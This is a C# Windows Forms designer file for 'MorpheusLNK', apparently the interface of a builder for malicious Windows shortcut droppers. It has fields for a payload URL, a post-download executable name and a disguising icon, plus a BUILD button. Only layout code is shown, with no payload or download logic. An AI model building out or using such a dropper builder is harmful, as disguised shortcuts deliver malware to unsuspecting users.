namespace MorpheusLNK
{
    partial class LNK_DROPPER
    {
        /// <summary>
        /// Required designer variable.
        /// </summary>
        private System.ComponentModel.IContainer components = null;

        /// <summary>
        /// Clean up any resources being used.
        /// </summary>
        /// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
        protected override void Dispose(bool disposing)
        {
            if (disposing && (components != null))
            {
                components.Dispose();
            }
            base.Dispose(disposing);
        }

        #region Windows Form Designer generated code

        /// <summary>
        /// Required method for Designer support - do not modify
        /// the contents of this method with the code editor.
        /// </summary>
        private void InitializeComponent()
        {
            this.label1 = new System.Windows.Forms.Label();
            this.downloadUrl_Box = new System.Windows.Forms.TextBox();
            this.label2 = new System.Windows.Forms.Label();
            this.lnkBuild_btn = new System.Windows.Forms.Button();
            this.statusLabel = new System.Windows.Forms.Label();
            this.saveFileDialog1 = new System.Windows.Forms.SaveFileDialog();
            this.afterExe_Name = new System.Windows.Forms.TextBox();
            this.label3 = new System.Windows.Forms.Label();
            this.pictureBox1 = new System.Windows.Forms.PictureBox();
            this.ink_Icon = new System.Windows.Forms.PictureBox();
            this.label4 = new System.Windows.Forms.Label();
            this.selectImg_BTN = new System.Windows.Forms.Button();
            this.openFileDialog1 = new System.Windows.Forms.OpenFileDialog();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox1)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.ink_Icon)).BeginInit();
            this.SuspendLayout();
            // 
            // label1
            // 
            this.label1.AutoSize = true;
            this.label1.Font = new System.Drawing.Font("Consolas", 24F, System.Drawing.FontStyle.Bold);
            this.label1.ForeColor = System.Drawing.Color.White;
            this.label1.Location = new System.Drawing.Point(10, 17);
            this.label1.Name = "label1";
            this.label1.Size = new System.Drawing.Size(215, 37);
            this.label1.TabIndex = 1;
            this.label1.Text = "LNK-BUILDER";
            // 
            // downloadUrl_Box
            // 
            this.downloadUrl_Box.Font = new System.Drawing.Font("Consolas", 9.75F, System.Drawing.FontStyle.Bold);
            this.downloadUrl_Box.Location = new System.Drawing.Point(17, 143);
            this.downloadUrl_Box.Multiline = true;
            this.downloadUrl_Box.Name = "downloadUrl_Box";
            this.downloadUrl_Box.Size = new System.Drawing.Size(370, 27);
            this.downloadUrl_Box.TabIndex = 2;
            this.downloadUrl_Box.Text = "payload-url";
            this.downloadUrl_Box.TextAlign = System.Windows.Forms.HorizontalAlignment.Center;
            // 
            // label2
            // 
            this.label2.AutoSize = true;
            this.label2.Font = new System.Drawing.Font("Consolas", 11F, System.Drawing.FontStyle.Bold);
            this.label2.ForeColor = System.Drawing.Color.White;
            this.label2.Location = new System.Drawing.Point(79, 114);
            this.label2.Name = "label2";
            this.label2.Size = new System.Drawing.Size(96, 18);
            this.label2.TabIndex = 4;
            this.label2.Text = "Payload url";
            // 
            // lnkBuild_btn
            // 
            this.lnkBuild_btn.BackColor = System.Drawing.Color.Black;
            this.lnkBuild_btn.Cursor = System.Windows.Forms.Cursors.Hand;
            this.lnkBuild_btn.FlatAppearance.BorderSize = 0;
            this.lnkBuild_btn.FlatAppearance.MouseDownBackColor = System.Drawing.Color.Purple;
            this.lnkBuild_btn.FlatAppearance.MouseOverBackColor = System.Drawing.Color.White;
            this.lnkBuild_btn.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.lnkBuild_btn.Font = new System.Drawing.Font("Nirmala UI", 9.75F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.lnkBuild_btn.ForeColor = System.Drawing.Color.MediumPurple;
            this.lnkBuild_btn.Location = new System.Drawing.Point(516, 413);
            this.lnkBuild_btn.Name = "lnkBuild_btn";
            this.lnkBuild_btn.Size = new System.Drawing.Size(205, 30);
            this.lnkBuild_btn.TabIndex = 5;
            this.lnkBuild_btn.Text = "BUILD";
            this.lnkBuild_btn.UseVisualStyleBackColor = false;
            this.lnkBuild_btn.Click += new System.EventHandler(this.lnkBuild_btn_Click);
            // 
            // statusLabel
            // 
            this.statusLabel.AutoSize = true;
            this.statusLabel.Font = new System.Drawing.Font("Consolas", 11F, System.Drawing.FontStyle.Bold);
            this.statusLabel.ForeColor = System.Drawing.Color.White;
            this.statusLabel.Location = new System.Drawing.Point(5, 425);
            this.statusLabel.Name = "statusLabel";
            this.statusLabel.Size = new System.Drawing.Size(0, 18);
            this.statusLabel.TabIndex = 6;
            // 
            // afterExe_Name
            // 
            this.afterExe_Name.Font = new System.Drawing.Font("Consolas", 9.75F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(204)));
            this.afterExe_Name.Location = new System.Drawing.Point(17, 223);
            this.afterExe_Name.Multiline = true;
            this.afterExe_Name.Name = "afterExe_Name";
            this.afterExe_Name.Size = new System.Drawing.Size(370, 27);
            this.afterExe_Name.TabIndex = 7;
            this.afterExe_Name.Text = "LNKBUILD.exe";
            this.afterExe_Name.TextAlign = System.Windows.Forms.HorizontalAlignment.Center;
            // 
            // label3
            // 
            this.label3.AutoSize = true;
            this.label3.Font = new System.Drawing.Font("Consolas", 11F, System.Drawing.FontStyle.Bold);
            this.label3.ForeColor = System.Drawing.Color.White;
            this.label3.Location = new System.Drawing.Point(79, 202);
            this.label3.Name = "label3";
            this.label3.Size = new System.Drawing.Size(160, 18);
            this.label3.TabIndex = 8;
            this.label3.Text = "After Download Name";
            // 
            // pictureBox1
            // 
            this.pictureBox1.Image = global::MorpheusLNK.Properties.Resources.noback;
            this.pictureBox1.Location = new System.Drawing.Point(409, 70);
            this.pictureBox1.Name = "pictureBox1";
            this.pictureBox1.Size = new System.Drawing.Size(303, 241);
            this.pictureBox1.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
            this.pictureBox1.TabIndex = 9;
            this.pictureBox1.TabStop = false;
            // 
            // ink_Icon
            // 
            this.ink_Icon.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle;
            this.ink_Icon.Location = new System.Drawing.Point(307, 64);
            this.ink_Icon.Name = "ink_Icon";
            this.ink_Icon.Size = new System.Drawing.Size(80, 68);
            this.ink_Icon.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
            this.ink_Icon.TabIndex = 10;
            this.ink_Icon.TabStop = false;
            // 
            // label4
            // 
            this.label4.AutoSize = true;
            this.label4.Font = new System.Drawing.Font("Consolas", 11F, System.Drawing.FontStyle.Bold);
            this.label4.ForeColor = System.Drawing.Color.White;
            this.label4.Location = new System.Drawing.Point(216, 67);
            this.label4.Name = "label4";
            this.label4.Size = new System.Drawing.Size(72, 18);
            this.label4.TabIndex = 11;
            this.label4.Text = "Icon Ink";
            // 
            // selectImg_BTN
            // 
            this.selectImg_BTN.BackColor = System.Drawing.Color.White;
            this.selectImg_BTN.Cursor = System.Windows.Forms.Cursors.Hand;
            this.selectImg_BTN.FlatAppearance.BorderSize = 0;
            this.selectImg_BTN.FlatAppearance.MouseDownBackColor = System.Drawing.Color.Purple;
            this.selectImg_BTN.FlatAppearance.MouseOverBackColor = System.Drawing.Color.White;
            this.selectImg_BTN.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.selectImg_BTN.Font = new System.Drawing.Font("Nirmala UI", 9.75F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.selectImg_BTN.ForeColor = System.Drawing.Color.Black;
            this.selectImg_BTN.Location = new System.Drawing.Point(221, 96);
            this.selectImg_BTN.Name = "selectImg_BTN";
            this.selectImg_BTN.Size = new System.Drawing.Size(63, 30);
            this.selectImg_BTN.TabIndex = 12;
            this.selectImg_BTN.Text = "select";
            this.selectImg_BTN.UseVisualStyleBackColor = false;
            this.selectImg_BTN.Click += new System.EventHandler(this.selectImg_BTN_Click);
            // 
            // openFileDialog1
            // 
            this.openFileDialog1.FileName = "openFileDialog1";
            // 
            // LNK_DROPPER
            // 
            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
            this.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(33)))), ((int)(((byte)(30)))), ((int)(((byte)(75)))));
            this.ClientSize = new System.Drawing.Size(733, 450);
            this.ControlBox = false;
            this.Controls.Add(this.selectImg_BTN);
            this.Controls.Add(this.label4);
            this.Controls.Add(this.ink_Icon);
            this.Controls.Add(this.pictureBox1);
            this.Controls.Add(this.label3);
            this.Controls.Add(this.afterExe_Name);
            this.Controls.Add(this.statusLabel);
            this.Controls.Add(this.lnkBuild_btn);
            this.Controls.Add(this.label2);
            this.Controls.Add(this.downloadUrl_Box);
            this.Controls.Add(this.label1);
            this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
            this.Name = "LNK_DROPPER";
            this.Text = "LNK_DROPPER";
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox1)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.ink_Icon)).EndInit();
            this.ResumeLayout(false);
            this.PerformLayout();

        }

        #endregion

        private System.Windows.Forms.Label label1;
        private System.Windows.Forms.TextBox downloadUrl_Box;
        private System.Windows.Forms.Label label2;
        private System.Windows.Forms.Button lnkBuild_btn;
        private System.Windows.Forms.Label statusLabel;
        private System.Windows.Forms.SaveFileDialog saveFileDialog1;
        private System.Windows.Forms.TextBox afterExe_Name;
        private System.Windows.Forms.Label label3;
        private System.Windows.Forms.PictureBox pictureBox1;
        private System.Windows.Forms.PictureBox ink_Icon;
        private System.Windows.Forms.Label label4;
        private System.Windows.Forms.Button selectImg_BTN;
        private System.Windows.Forms.OpenFileDialog openFileDialog1;
    }
}